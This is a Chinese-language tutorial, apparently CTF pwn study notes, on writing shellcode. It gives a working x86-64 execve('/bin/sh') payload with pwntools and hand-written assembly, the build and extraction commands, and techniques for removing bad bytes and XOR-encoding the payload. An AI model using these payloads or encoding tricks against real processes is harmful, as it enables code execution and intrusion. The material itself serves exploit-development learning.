### 二. shellcode

1. shellcode 是什么
2. 系统调用
3. shellcode 的编写与获得
4. shellcode 变异

#### 1. 啥是shellcode

shellcode 泛指在目标进程空间中, 运行的一段自定义代码。因为攻击者往往会设计通过shellcode获得一个可交互式的shell, 因此得名。

#### 2. 系统调用

说到shellcode则必须要知道系统调用的原理。计算机的CPU是以通过读取在RAM中存储的指令机器码, 根据事先定义好的规则, 来操作各个寄存器将数据送往目标运算模块, 再将运算结果返回到某个目标寄存器中。这里需要注意的有两点:

1. 机器码本身是各种十六进制的数字, 在不同的架构上可能有细节的区别, 比如x86-32和x86-64, 如:

mov eax, 0x1      # 32位 b8 01 00 00 00
mov rax, 0x1      # 64位 48 c7 c0 01 00 00 00

48代表用16位格式读取, c7是操作码, c0是rax寄存器, 01 00 00 00 是小端存储的0x1数据。需要记得64位的通常可以兼容32位的汇编代码执行。

简单来说, CPU是无法区分数据和代码的, 因此只要是在可执行页上的东西, eip/rip指向了, 就可以执行。

2. 所有执行的操作都是事先定义好的, 有公开的编码表, 对应读取某个操作码需要根据标识符和一些东西来确定执行的操作。
http://ref.x86asm.net/coder64.html

操作系统的进程空间可以分为用户空间与内核空间, 所有的系统调用的执行均在内核空间中进行。

系统调用通常由系统中断触发时, eax寄存器所带有的值来确定进行何种系统调用。简单来说, 系统调用是一种最底层的功能封装, 将某种功能的实现代码封装起来, 用系统调用的方式来触发函数功能, http://lxr.linux.no/linux+v3.2/arch/x86/include/asm/unistd_64.h , 该网址提供了x86-64架构的系统调用表, http://lxr.linux.no/linux+v3.2/arch/x86/include/asm/unistd_32.h 则是32位的调用表(https://blog.csdn.net/xiaominthere/article/details/17287965)。两种调用的方式有一些区别:

x86-32:

mov eax, 61 # chroot调用
lea ebx, word ptr string  # 指向某个字符串的指针
int 0x80  # 中断表中的系统调用

x86-64

mov rax, 161  # chroot调用
lea rbx, dword ptr string # 指向字符串的指针
syscall # 系统调用

#### 3. shellcode的编写
https://docs.pwntools.com/en/stable/

我一般只用pwntools和手撸=。=, 所以先简要介绍pwntools

pwntools是一个专门快速写poc或者exp或者打ctf做pwn题用的工具, 集成了许多功能, 这里我们先介绍shellcode的获取。

```python
from pwn import *

context(os='linux', arch='amd64', bits=64, log_level='debug')  # 设置目标架构, x86是i386
shellcode = shellcraft.sh() # 获得一个最简单的shellcode
print(disasm(asm(shellcode))) # 打印出来
```

这里asm(shellcode)就是我们需要的二进制数据。pwntools会对汇编代码进行编译并将结果取回返回给我们。除了sh(), shellcraft内还集成了其他的系统调用功能(可以自己慢慢试)。

手写的话其实大同小异, 关键在于你要清楚自己需要作什么操作, 给哪个寄存器设置什么值, 函数调用需要的参数如何传递以及参数格式。https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/

以下是一个简单的shellcode.s
```armasm
.global _start
_start:
.intel_syntax noprefix
        mov rax, 59
        lea rdi, [rip+binsh]
        mov rsi, 0
        mov rdx, 0
        syscall
binsh:
        .string "/bin/sh"
```
使用gcc进行编译, 注意编译选项-nostdlib, 该选项将让该文件不与系统库文件进行链接, 以保证纯净。

```bash
gcc -nostdlib -static shellcode.s -o shellcode
```

使用objdump可以将该编译文件的.text段(也就是汇编代码段内容)获取。
```bash
objcopy --dump-section .text=shellcode.md shellcode
```

#### 4. shellcode变异

但是通常情况下, 我们会遇到许多问题, 比如最简单的情况, 如果目标可执行文件用read()接受输入, 则会遇到'\n'截断, 即'\x0a'或是'\x00', 这要求我们的shellcode不能带有这些特殊字符。我们需要了解如何变异shellcode。

前面给出了一个shellcode样例, 但是这个东西编译出来是有问题的

```armasm
bluecat@kali:~/catroot/pwn/shellcode$ objdump -M intel -d shellcode_01_elf

shellcode_01_elf：     文件格式 elf64-x86-64


Disassembly of section .text:

0000000000401000 <_start>:
  401000:       48 c7 c0 3b 00 00 00    mov    rax,0x3b
  401007:       48 8d 3d 10 00 00 00    lea    rdi,[rip+0x10]        # 40101e <binsh>
  40100e:       48 c7 c6 00 00 00 00    mov    rsi,0x0
  401015:       48 c7 c2 00 00 00 00    mov    rdx,0x0
  40101c:       0f 05                   syscall

000000000040101e <binsh>:
  40101e:       2f                      (bad)
  40101f:       62                      (bad)
  401020:       69                      .byte 0x69
  401021:       6e                      outs   dx,BYTE PTR ds:[rsi]
  401022:       2f                      (bad)
  401023:       73 68                   jae    40108d <binsh+0x6f>
```

常用的变异手段有:

xor rax, rbx          异或
mov al, x             用低位/高位赋值操作, 或16位、8位赋值操作
mov rax, x-n          先减后加
add rax, n
inc rax               加减1操作
dec rax
mov rax, [addr]       事先从源代码中搜索是否有存在相近数值的地址, 从那个地方取值


还有就是在运行过程中将真实shellcode释放的, 有点类似加壳或者压缩的方式。

[decode area]
[encode shellcode area]

在运行完decode部分代码之后, 真实的shellcode才会被还原。可以用异或运算壳, 或者是简单的加密计算壳(因为shellcode需要尽可能小, 当然如果空间允许, 想怎么写都行)
